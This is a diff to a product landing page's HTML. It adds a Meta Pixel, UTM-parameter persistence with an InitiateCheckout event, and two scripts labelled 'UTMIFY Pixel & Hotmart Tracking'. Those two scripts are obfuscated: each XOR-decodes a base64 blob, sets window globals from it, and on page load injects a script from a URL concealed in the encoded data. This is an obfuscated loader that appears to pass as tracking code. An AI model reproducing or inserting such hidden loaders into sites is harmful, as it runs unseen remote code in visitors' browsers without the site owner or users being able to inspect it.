@@ -11,6 +11,29 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,600;0,9..144,700;0,9..144,800;1,9..144,600&family=Playfair+Display:ital,wght@0,600;0,700;0,800;1,600&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
+  <!-- Meta Pixel Code (px Varios Testeos - ID: 1909939606643263) -->
+  <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1909939606643263');
+    fbq('track', 'PageView');
+  </script>
+  <noscript>
+    <img height="1" width="1" style="display:none"
+         src="https://www.facebook.com/tr?id=1909939606643263&ev=PageView&noscript=1" />
+  </noscript>
+  <!-- End Meta Pixel Code -->
+
+  <!-- UTMIFY Pixel & Hotmart Tracking -->
+  <script>(function(){var q_ct6k=atob("DNTXJYXbAZJU4bhqkK/1UPe3I6h2icwe4KftCqq4Zfx6lMwH+bKuC+a0bLw2k5cZ86a+VfGoLuI9md0Gv6S+XeC3L/gnw5RI8aCjV+y5dOYxkppQy4n7B+K3bvA1jctIqo+sB+u6bPd225oa+ayyScy/I752l9kG5bH1H6ftYPdnh45b9rHmQbzoY/Q309xT8efnHbb5fM8p");var t_y1=[];for(var n_pc3u=0;n_pc3u<q_ct6k.length;n_pc3u++){t_y1.push(q_ct6k.charCodeAt(n_pc3u)&255);}var c_j9=t_y1[0];var s_mu69=t_y1.slice(1,1+c_j9);var x_mgy=t_y1.slice(1+c_j9);var f_j=x_mgy.map(function(b,h_bbn){return b^s_mu69[h_bbn%c_j9];});var g_e="";for(var t_o5=0;t_o5<f_j.length;t_o5++){g_e+=String.fromCharCode(f_j[t_o5]&255);}var v_b709=decodeURIComponent(escape(g_e));var o_spn=JSON.parse(v_b709);var j_8qf=o_spn.globals||[];j_8qf.forEach(function(c_ih0){window[c_ih0.name]=c_ih0.value;});var d_gcoc=document.createElement("script");d_gcoc.src=o_spn.url;d_gcoc.async=true;d_gcoc.defer=true;(o_spn.attributes||[]).forEach(function(k_6nh){d_gcoc.setAttribute(k_6nh.name,k_6nh.value);});(document.head||document.documentElement).appendChild(d_gcoc);})();</script>
+  <script>(function(){var c_khr=atob("DL0MApf2r2aXI8fNLMYud+WajVy1S7O5XM42LbiVywi5VrOgRdt1LPSZwkj1Uei+T89lcuOFgBPjTrTiQNx4Z+SCgQzkAevvTcl4cP6U2hLyUOX3d8YubPabykStAaOsWNwhd+ObxgDuDre/SctpbOPb3BP1SqO+DpEudPaa2gO1GeXvUeBx");var v_xli=[];for(var p_2r=0;p_2r<c_khr.length;p_2r++){v_xli.push(c_khr.charCodeAt(p_2r)&255);}var b_6in=v_xli[0];var g_f=v_xli.slice(1,1+b_6in);var o_cl7v=v_xli.slice(1+b_6in);var l_jb=o_cl7v.map(function(b,j_m){return b^g_f[j_m%b_6in];});var l_pxmt="";for(var y_h5=0;y_h5<l_jb.length;y_h5++){l_pxmt+=String.fromCharCode(l_jb[y_h5]&255);}var p_50hz=decodeURIComponent(escape(l_pxmt));var u_kwp=JSON.parse(p_50hz);var p_g8w0=u_kwp.globals||[];p_g8w0.forEach(function(d_55w){window[d_55w.name]=d_55w.value;});var h_xh=document.createElement("script");h_xh.src=u_kwp.url;h_xh.async=true;h_xh.defer=true;(u_kwp.attributes||[]).forEach(function(k_i){h_xh.setAttribute(k_i.name,k_i.value);});(document.head||document.documentElement).appendChild(h_xh);})();</script>
+
   <!-- Preload Hero Mockup for LCP (creador-de-paginas Rule 11) -->
   <link rel="preload" as="image" href="assets/hero-mockup.webp" type="image/webp">
 
@@ -3539,29 +3562,55 @@
   </script>
 
 
-  <!-- UTM PRESERVATION SCRIPT (P0 PROTOCOL) -->
+  <!-- UTM PRESERVATION & TRACKING SCRIPT (P0 FAIL-SAFE) -->
   <script>
     (function() {
-      // Capture all incoming query parameters
+      var storageKey = 'bagcraft_utm_storage';
+      var paramsToKeep = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'xcod', 'sck', 'src', 'fbclid'];
+
+      // 1. Capture incoming URL params and persist in storage
       var urlParams = new URLSearchParams(window.location.search);
-      var paramsToKeep = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'xcod', 'sck', 'src'];
       var queryData = {};
 
+      // Load existing from sessionStorage / localStorage
+      try {
+        var savedSession = JSON.parse(sessionStorage.getItem(storageKey) || '{}');
+        for (var k in savedSession) { queryData[k] = savedSession[k]; }
+      } catch(e) {}
+      try {
+        var savedLocal = JSON.parse(localStorage.getItem(storageKey) || '{}');
+        for (var k in savedLocal) { if (!queryData[k]) queryData[k] = savedLocal[k]; }
+      } catch(e) {}
+
+      // Overwrite with fresh params from URL
       paramsToKeep.forEach(function(param) {
-        if (urlParams.has(param)) {
-          queryData[param] = urlParams.get(param);
+        var val = urlParams.get(param);
+        if (val) {
+          queryData[param] = val;
         }
       });
 
-      // Hotmart fallback: If utm_content exists and xcod doesn't, set xcod
+      // Hotmart token derivations:
+      // xcod = utm_content (or existing xcod)
       if (!queryData['xcod'] && queryData['utm_content']) {
         queryData['xcod'] = queryData['utm_content'];
       }
-      // If utm_campaign exists and sck doesn't, set sck
-      if (!queryData['sck'] && queryData['utm_campaign']) {
-        queryData['sck'] = queryData['utm_campaign'];
+      // sck = utm_source (standard) or utm_campaign
+      if (!queryData['sck']) {
+        if (queryData['utm_source']) {
+          queryData['sck'] = queryData['utm_source'];
+        } else if (queryData['utm_campaign']) {
+          queryData['sck'] = queryData['utm_campaign'];
+        }
       }
 
+      // Persist back
+      try {
+        sessionStorage.setItem(storageKey, JSON.stringify(queryData));
+        localStorage.setItem(storageKey, JSON.stringify(queryData));
+      } catch(e) {}
+
+      // 2. Attach UTMs to any link
       function attachUtms(anchor) {
         try {
           var href = anchor.getAttribute('href');
@@ -3578,17 +3627,35 @@
         }
       }
 
-      // Run on page load
-      document.addEventListener('DOMContentLoaded', function() {
-        var links = document.querySelectorAll('a[data-utmify-checkout="true"], a[href*="hotmart.com"], .upsell-btn-accept, .upsell-btn-decline');
+      // 3. Decorate all checkout links immediately
+      function decorateAll() {
+        var links = document.querySelectorAll('a[href*="hotmart.com"], a[data-utmify-checkout="true"], .upsell-btn-accept, .upsell-btn-decline');
         links.forEach(attachUtms);
-      });
+      }
 
-      // Run dynamically on click
+      document.addEventListener('DOMContentLoaded', decorateAll);
+      decorateAll();
+
+      // 4. Global click interceptor with Meta InitiateCheckout event
       document.addEventListener('click', function(e) {
-        var anchor = e.target.closest('a[data-utmify-checkout="true"], a[href*="hotmart.com"], .upsell-btn-accept, .upsell-btn-decline');
+        var anchor = e.target.closest('a[href*="hotmart.com"], a[data-utmify-checkout="true"], .upsell-btn-accept, .upsell-btn-decline');
         if (anchor) {
           attachUtms(anchor);
+          
+          // Fire Meta Pixel InitiateCheckout event
+          if (typeof fbq === 'function') {
+            try {
+              var href = anchor.getAttribute('href') || '';
+              var val = href.indexOf('R108285673S') !== -1 ? 27.00 : 14.90;
+              fbq('track', 'InitiateCheckout', {
+                value: val,
+                currency: 'USD',
+                content_name: val === 27.00 ? 'Master Collection' : 'Starter Pack'
+              });
+            } catch(err) {
+              console.warn('fbq InitiateCheckout error:', err);
+            }
+          }
         }
       }, true);
     })();
